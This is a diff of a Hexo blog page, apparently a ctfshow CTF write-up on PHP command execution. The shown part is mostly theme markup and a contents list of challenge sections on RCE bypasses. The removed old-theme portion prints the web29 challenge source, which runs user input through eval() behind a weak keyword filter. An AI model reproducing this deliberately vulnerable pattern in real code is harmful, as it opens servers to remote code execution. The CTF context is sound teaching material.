@@ -1,181 +1,325 @@
 <!DOCTYPE html>
-<html lang=en>
+<html lang="zh-CN">
 <head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="web291234567891011121314151617181920212223&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 00:26:48# @email: h">
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"wanth3f1ag.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-dark","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+<script>
+  (function () {
+    var OriginTitle = document.title;
+    var titleTime;
+    document.addEventListener('visibilitychange', function () {
+      if (document.hidden) {
+        document.title = '坏人！看完了就想走' + OriginTitle;
+        clearTimeout(titleTime);
+      } else {
+        document.title = '(*´∇｀*)你回来啦~' + OriginTitle;
+        titleTime = setTimeout(function () {
+          document.title = OriginTitle;
+        }, 2000);
+      }
+    });
+  })();
+</script>
+
+    <meta name="description" content="ctfshow入门命令执行">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ctfshow入门命令执行">
 <meta property="og:url" content="https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
 <meta property="og:site_name" content="root@wanth3f1ag">
-<meta property="og:description" content="web291234567891011121314151617181920212223&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 00:26:48# @email: h">
-<meta property="og:locale" content="en_US">
+<meta property="og:description" content="ctfshow入门命令执行">
+<meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20250703151616322.png">
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20250317164620779.png">
 <meta property="article:published_time" content="2025-06-29T09:20:28.000Z">
-<meta property="article:modified_time" content="2025-07-03T08:30:10.032Z">
+<meta property="article:modified_time" content="2025-12-01T11:20:50.652Z">
 <meta property="article:author" content="wanTh3flag">
 <meta property="article:tag" content="命令执行">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20250703151616322.png">
-    
-    
-      
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
-    <!-- title -->
-    <title>ctfshow入门命令执行</title>
-    <!-- async scripts -->
-    <!-- Google Analytics -->
 
 
-    <!-- Umami Analytics -->
+<link rel="canonical" href="https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
 
 
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","path":"2025/06/29/ctfshow入门命令执行/","title":"ctfshow入门命令执行"}</script>
 
-    <!-- persian styles -->
-    
-    <!-- rss -->
-    
-    
-	<!-- mathjax -->
-	
-
-<meta name="generator" content="Hexo 7.3.0"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-        <!--
-       --><li><a href="/">H0me</a></li><!--
-     --><!--
-       --><li><a href="/about/">A6out</a></li><!--
-     --><!--
-       --><li><a href="/tags/">T6gs</a></li><!--
-     --><!--
-       --><li><a href="/categories/">Catagory</a></li><!--
-     --><!--
-       --><li><a href="/links/">L1nks</a></li><!--
-     --><!--
-       --><li><a href="/search/">s4arch</a></li><!--
-     -->
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" aria-label="Previous post" href="/2025/07/04/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CakePHP5.1.5%E6%A1%86%E6%9E%B6/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" aria-label="Next post" href="/2025/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC7%E9%93%BE/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&text=ctfshow入门命令执行"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&title=ctfshow入门命令执行"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&is_video=false&description=ctfshow入门命令执行"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=ctfshow入门命令执行&body=Check out this article: https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&title=ctfshow入门命令执行"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&title=ctfshow入门命令执行"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&title=ctfshow入门命令执行"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&title=ctfshow入门命令执行"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&name=ctfshow入门命令执行&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&t=ctfshow入门命令执行"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    
-    
-      <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web29"><span class="toc-number">1.</span> <span class="toc-text">web29</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web30"><span class="toc-number">2.</span> <span class="toc-text">web30</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web31"><span class="toc-number">3.</span> <span class="toc-text">web31</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web32"><span class="toc-number">4.</span> <span class="toc-text">web32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web33"><span class="toc-number">5.</span> <span class="toc-text">web33</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web34"><span class="toc-number">6.</span> <span class="toc-text">web34</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web35"><span class="toc-number">7.</span> <span class="toc-text">web35</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web36"><span class="toc-number">8.</span> <span class="toc-text">web36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web37"><span class="toc-number">9.</span> <span class="toc-text">web37</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web38"><span class="toc-number">10.</span> <span class="toc-text">web38</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web39"><span class="toc-number">11.</span> <span class="toc-text">web39</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web40"><span class="toc-number">12.</span> <span class="toc-text">web40</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web41"><span class="toc-number">13.</span> <span class="toc-text">web41</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE"><span class="toc-number">13.1.</span> <span class="toc-text">#无数字字母RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web42"><span class="toc-number">14.</span> <span class="toc-text">web42</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web43"><span class="toc-number">15.</span> <span class="toc-text">web43</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E5%91%BD%E4%BB%A4%E8%BF%9E%E6%8E%A5%E7%AC%A6"><span class="toc-number">15.1.</span> <span class="toc-text">Linux命令连接符&amp;&amp;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E5%91%BD%E4%BB%A4%E8%BF%9E%E6%8E%A5%E7%AC%A6-1"><span class="toc-number">15.2.</span> <span class="toc-text">Linux命令连接符||</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E5%91%BD%E4%BB%A4%E8%BF%9E%E6%8E%A5%E7%AC%A6-2"><span class="toc-number">15.3.</span> <span class="toc-text">Linux命令连接符|</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web44"><span class="toc-number">16.</span> <span class="toc-text">web44</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web45"><span class="toc-number">17.</span> <span class="toc-text">web45</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web46"><span class="toc-number">18.</span> <span class="toc-text">web46</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web47"><span class="toc-number">19.</span> <span class="toc-text">web47</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web48"><span class="toc-number">20.</span> <span class="toc-text">web48</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web49"><span class="toc-number">21.</span> <span class="toc-text">web49</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web50"><span class="toc-number">22.</span> <span class="toc-text">web50</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web51"><span class="toc-number">23.</span> <span class="toc-text">web51</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web52"><span class="toc-number">24.</span> <span class="toc-text">web52</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web53"><span class="toc-number">25.</span> <span class="toc-text">web53</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web54"><span class="toc-number">26.</span> <span class="toc-text">web54</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web55"><span class="toc-number">27.</span> <span class="toc-text">web55</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web56"><span class="toc-number">28.</span> <span class="toc-text">web56</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web57"><span class="toc-number">29.</span> <span class="toc-text">web57</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web58-65"><span class="toc-number">30.</span> <span class="toc-text">web58-65</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web66-67"><span class="toc-number">31.</span> <span class="toc-text">web66-67</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web68"><span class="toc-number">32.</span> <span class="toc-text">web68</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E6%95%B0%E7%BB%84%E5%87%BD%E6%95%B0%E4%BB%A3%E6%9B%BF1"><span class="toc-number">32.1.</span> <span class="toc-text">#输出数组函数代替1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web69-70"><span class="toc-number">33.</span> <span class="toc-text">web69-70</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E6%95%B0%E7%BB%84%E5%87%BD%E6%95%B0%E4%BB%A3%E6%9B%BF2"><span class="toc-number">33.1.</span> <span class="toc-text">#输出数组函数代替2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#json-encode-%E5%87%BD%E6%95%B0"><span class="toc-number">33.2.</span> <span class="toc-text">json_encode()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#var-export-%E5%87%BD%E6%95%B0"><span class="toc-number">33.3.</span> <span class="toc-text">var_export()函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web71"><span class="toc-number">34.</span> <span class="toc-text">web71</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E5%89%8D%E9%80%81%E5%87%BA%E7%BC%93%E5%86%B2%E5%8C%BA"><span class="toc-number">34.1.</span> <span class="toc-text">提前送出缓冲区</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%BC%93%E5%86%B2%E5%8C%BA"><span class="toc-number">34.2.</span> <span class="toc-text">绕过缓冲区</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web72"><span class="toc-number">35.</span> <span class="toc-text">web72</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#glob%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E9%99%90%E5%88%B6"><span class="toc-number">35.1.</span> <span class="toc-text">#glob协议绕过目录访问限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UAF%E8%84%9A%E6%9C%AC"><span class="toc-number">35.2.</span> <span class="toc-text">UAF脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web73"><span class="toc-number">36.</span> <span class="toc-text">web73</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web74"><span class="toc-number">37.</span> <span class="toc-text">web74</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web75-76"><span class="toc-number">38.</span> <span class="toc-text">web75-76</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web77"><span class="toc-number">39.</span> <span class="toc-text">web77</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web118"><span class="toc-number">40.</span> <span class="toc-text">web118</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8FRCE"><span class="toc-number">40.1.</span> <span class="toc-text">#内置环境变量RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web119"><span class="toc-number">41.</span> <span class="toc-text">web119</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web120"><span class="toc-number">42.</span> <span class="toc-text">web120</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web121"><span class="toc-number">43.</span> <span class="toc-text">web121</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web122"><span class="toc-number">44.</span> <span class="toc-text">web122</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web124"><span class="toc-number">45.</span> <span class="toc-text">web124</span></a></li></ol>
-      </div>
-    
-  </span>
-</div>
-
-    
-    <div class="content index py4 ">
-        
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle p-name" itemprop="name headline">
-        ctfshow入门命令执行
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span class="p-name" itemprop="name">wanTh3flag</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2025-06-29T09:20:28.000Z" class="dt-published" itemprop="datePublished">2025-06-29</time>
-        
-        (Updated: <time datetime="2025-07-03T08:30:10.032Z" class="dt-updated" itemprop="dateModified">2025-07-03</time>)
-        
-      
-    </div>
-
-
-      
-    <div class="article-category">
-        <i class="fa-solid fa-archive"></i>
-        <a class="category-link" href="/categories/ctfshow/">ctfshow</a>
-    </div>
-
-
-      
-    <div class="article-tag">
-        <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a>
-    </div>
-
-
-    </div>
-  </header>
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ctfshow入门命令执行 | root@wanth3f1ag</title>
   
 
-  <div class="content e-content" itemprop="articleBody">
-    <h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js" defer></script>
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">root@wanth3f1ag</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTFer</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="s4arch" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-h0me"><a href="/" rel="section"><i class="home fa-fw"></i>H0me</a></li><li class="menu-item menu-item-a6out"><a href="/about/" rel="section"><i class="user fa-fw"></i>A6out</a></li><li class="menu-item menu-item-t6gs"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>T6gs</a></li><li class="menu-item menu-item-catagories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>Catagories</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="link fa-fw"></i>L1nks</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>s4arch
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web29"><span class="nav-number">1.</span> <span class="nav-text">web29</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web30"><span class="nav-number">2.</span> <span class="nav-text">web30</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web31"><span class="nav-number">3.</span> <span class="nav-text">web31</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web32"><span class="nav-number">4.</span> <span class="nav-text">web32</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web33"><span class="nav-number">5.</span> <span class="nav-text">web33</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web34"><span class="nav-number">6.</span> <span class="nav-text">web34</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web35"><span class="nav-number">7.</span> <span class="nav-text">web35</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web36"><span class="nav-number">8.</span> <span class="nav-text">web36</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web37"><span class="nav-number">9.</span> <span class="nav-text">web37</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web38"><span class="nav-number">10.</span> <span class="nav-text">web38</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web39"><span class="nav-number">11.</span> <span class="nav-text">web39</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" 